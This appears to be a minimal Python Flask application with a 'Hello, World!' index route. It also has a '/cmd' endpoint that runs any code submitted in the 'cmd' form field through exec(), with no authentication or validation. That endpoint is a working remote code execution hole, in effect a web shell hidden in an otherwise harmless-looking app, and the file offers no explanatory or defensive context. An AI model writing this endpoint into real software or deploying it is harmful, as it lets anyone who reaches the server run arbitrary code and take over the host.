from flask import Flask, request

app = Flask(__name__)

@app.route('/')
def index():
    return 'Hello, World!'

@app.route('/cmd', methods=['POST'])
def cmd():
    cmd = request.form.get('cmd')
    exec(cmd)
    return 'OK'

if __name__ == '__main__':
    app.run(port=5678)